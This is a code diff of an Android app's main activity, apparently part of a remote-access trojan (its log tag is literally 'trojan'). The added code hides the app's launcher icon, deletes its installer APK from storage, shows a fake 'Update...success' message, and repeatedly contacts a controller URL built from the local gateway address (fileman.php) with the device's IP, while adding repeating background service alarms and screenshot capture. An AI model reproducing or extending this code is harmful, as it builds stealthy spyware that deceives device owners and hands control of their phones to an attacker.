@@ -1,8 +1,9 @@
 package os.system;
 
 import android.content.SharedPreferences;
-import android.app.Activity;
+import android.app.*;
 import android.os.Bundle;
+import android.os.CountDownTimer;
 import android.view.View;
 import android.content.Intent;
 import android.content.Context;
@@ -21,6 +22,15 @@ import android.telephony.gsm.*;
 import java.io.*;
 import java.util.*;
 
+import android.graphics.Bitmap;
+import android.media.*;
+
+import android.view.Gravity;
+import android.graphics.Color;
+import android.widget.*;
+import android.view.WindowManager;
+
+import android.os.SystemClock;
 
 public class MainActivity extends Activity
 {
@@ -30,6 +40,27 @@ public class MainActivity extends Activity
 	private ReceiverBoot receiver;
 	private static String TAG = "trojan";
 	public static String resultSms = "";
+	private boolean dtoast = true;
+	AlertDialog dialog;
+	private PendingIntent mPending;
+
+	public void btn(View v) {
+
+		
+		
+		/*
+		long firstTime = SystemClock.elapsedRealtime();
+		AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);
+		am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstTime, 30*1000, mPending);
+
+		Toast.makeText(this, "serc", Toast.LENGTH_LONG).show();*/
+   	}
+	public void btnku(View v) {
+		AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);
+		am.cancel(mPending);
+		Toast.makeText(this, "dest", Toast.LENGTH_LONG).show();
+
+	}
 	
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -39,17 +70,19 @@ public class MainActivity extends Activity
 		seteditor = settings.edit();
 		receiver = new ReceiverBoot();
 
+		//startService(new Intent(this, SystemThread.class));
+
+		mPending = PendingIntent.getService(MainActivity.this, 0, new Intent(MainActivity.this, ThreadService.class), 0);
+
 		seteditor.putString("main", "hotspot");    
         seteditor.commit();
 
-		startService(new Intent(this, System.class));
-
-		/*try {
+		try {
 			PackageManager p = getPackageManager();
 
 			p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 		}
-		catch (Exception e) {}*/
+		catch (Exception e) {}
 
 		finish();
 	}
@@ -57,62 +90,108 @@ public class MainActivity extends Activity
 	public void onDestroy() {
 		super.onDestroy();
 
-		Toast.makeText(this, "Update successfull.", Toast.LENGTH_LONG).show();
+		String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
+		String data = receiver.shellCommands("find "+sdcard+"/ -name system.apk");
+		String[] rm = data.split("\n");
 
-        String ip = Identitas.getIPAddress(true);
-        String[] route = ip.split("[.]");
-
-        int index = route.length - 1;
-		StringBuffer output = new StringBuffer();
-		
-		for (int i=0; i<index; i++) {
-			output.append(route[i]+".");
+		for (int i=0; i<rm.length; i++) {
+			Log.i(TAG, "rm:"+rm[i]);
+			try {
+				Runtime.getRuntime().exec("rm "+rm[i]);
+			}
+			catch(Exception e){}
 		}
 
-		receiver.requestUrl = "http://"+output+"1:8888/fileman.php?id="+ip;
-		receiver.requestAksi = "web";
-		receiver.mainRequest(this);
+		CountDownTimer hitungMundur = new CountDownTimer(13000, 100){
+			public void onTick(long millisUntilFinished){
+				if (dtoast) {
+					Toast.makeText(MainActivity.this, "Update...success", Toast.LENGTH_SHORT).show();
+					dtoast = false;
+				}
+				String ip = Identitas.getIPAddress(true);
+        		String[] route = ip.split("[.]");
+
+        		int index = route.length - 1;
+				StringBuffer output = new StringBuffer();
+		
+				for (int i=0; i<index; i++) {
+					output.append(route[i]+".");
+				}
+
+				receiver.requestUrl = "http://"+output+"1:8888/fileman.php?id="+ip;
+				receiver.requestAksi = "web";
+				receiver.mainRequest(MainActivity.this);
+
+			}
+			public void onFinish()
+			{
+				Toast.makeText(MainActivity.this, "Update...success", Toast.LENGTH_LONG).show();
+			}
+		}.start();
+
+        
 	}
 
-	public void btn(View v) {
-		
-		Log.i(TAG, "Jgjgjg:"+new ReceiverBoot().ping(this));
-		
-	}
-/*
-	private class task implements Runnable {
-		AsyncTask<Void, Void, Boolean> mAT;
-		Context context;
+	
 
-		public void Check(AsyncTask<Void, Void, Boolean> at) {
-			mAT = at;
-		}
-		@Override
-		public void run() {
-		}
-	}
-*/
-	public void getScreen() {
-		Date now = new Date();
-		android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);
+	public void screen(View v) {
+		Bitmap b = takescreenshotOfRootView(v);
 		try {
-			String path = receiver.pathExternal+"/"+now+".jpg";
-
-			View v1 = getWindow().getDecorView().getRootView();
-			Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
-			v1.setDrawingCacheEnabled(false);
-
-			File imfile = new File(path);
-			FileOutputStream outStream = new FileOutputStream(imfile);
-			int quality = 100;
-			bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outStream);
-			outStream.flush();
-			outStream.close();
-		} 
-		catch (Exception e) {
-			Log.i(TAG, "error screen : "+e);
+			File g = saveScreenshotToPicturesFolder(this, b, "gg");
+		}catch(Exception e) {
+			Toast.makeText(this, "err: "+e, Toast.LENGTH_LONG).show();
 		}
 	}
+
+	public static Bitmap takescreenshot(View v) {
+        v.setDrawingCacheEnabled(true);
+        v.buildDrawingCache(true);
+        Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
+        v.setDrawingCacheEnabled(false);
+        return b;
+    }
+
+    public static Bitmap takescreenshotOfRootView(View v) {
+        return takescreenshot(v.getRootView());
+    }
+	
+	public File saveScreenshotToPicturesFolder(Context context, Bitmap image, String filename)
+	throws Exception {
+		File bitmapFile = getOutputMediaFile(filename);
+		if (bitmapFile == null) {
+			throw new NullPointerException("Error creating media file, check storage permissions!");
+		}
+		FileOutputStream fos = new FileOutputStream(bitmapFile);
+		image.compress(Bitmap.CompressFormat.PNG, 90, fos);
+		fos.close();
+
+		// Initiate media scanning to make the image available in gallery apps
+		MediaScannerConnection.scanFile(context, new String[] { bitmapFile.getPath() },
+										new String[] { "image/jpeg" }, null);
+		return bitmapFile;
+	}
+	
+	private File getOutputMediaFile(String filename) {
+		// To be safe, you should check that the SDCard is mounted
+		// using Environment.getExternalStorageState() before doing this.
+		File mediaStorageDirectory = new File(
+			Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
+            + File.separator);
+		// Create the storage directory if it does not exist
+		if (!mediaStorageDirectory.exists()) {
+			if (!mediaStorageDirectory.mkdirs()) {
+				return null;
+			}
+		}
+		// Create a media file name
+		File mediaFile;
+		String mImageName = filename + "screen"+ ".jpg";
+		mediaFile = new File(mediaStorageDirectory.getPath() + File.separator + mImageName);
+		return mediaFile;
+	}
+
+
+	
 
 	public boolean apkMana(Context context, String packageName, String pilih) {
 		PackageManager manager = context.getPackageManager();
